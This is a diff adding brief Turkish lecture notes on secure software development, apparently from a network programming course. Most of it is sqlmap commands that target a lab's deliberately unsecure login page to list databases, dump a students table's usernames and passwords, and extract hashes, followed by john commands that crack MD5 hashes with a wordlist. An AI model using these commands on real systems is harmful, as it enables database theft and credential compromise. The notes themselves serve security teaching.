@@ -1,0 +1,41 @@
+
+Güvenli Yazılım Geliştirme Yaşam Döngüsü
+
+OWASP
+
+OWASP TOP 10
+
+OWASP ZAP
+
+Sql Injection 
+
+	Sqlmap
+	    sqlmap -u "http://172.16.0.1/NetworkProgramming/Lecture7/UnsecureWebApplication/Dogrula.php" --data "personelNo=23432&sifre=23423432" --dbs --level=4 --risk=3
+
+        sqlmap -u "http://172.16.0.1/NetworkProgramming/Lecture7/UnsecureWebApplication/Dogrula.php" --data "personelNo=23432&sifre=23423432" --dbs -D ob --tables
+
+        sqlmap -u "http://172.16.0.1/NetworkProgramming/Lecture7/UnsecureWebApplication/Dogrula.php" --data "personelNo=23432&sifre=23423432" --dbs -D ob -T ogrenciler -C adi,sifre --dump
+        (md5 şifreleri de kırabilir (seçeneklerde sorar...))
+
+        sqlmap -u "http://172.16.0.1/NetworkProgramming/Lecture7/UnsecureWebApplication/Dogrula.php" --data "personelNo=23432&sifre=23423432" --passwords
+        (md5 şifreleri de kırabilir (seçeneklerde sorar...))
+        --hostname
+        --current-db
+        --users
+        --passwords
+        --privileges
+        --roles
+    john
+          101  cd /tmp/
+          111  cp /usr/share/sqlmap/txt/wordlist.zip ./
+          113  unzip wordlist.zip
+          118  john sqlmaphashes-cLla5W.txt --wordlist=./wordlist.txt --format=raw-md5
+
+XSS
+
+
+Beef
+
+
+
+
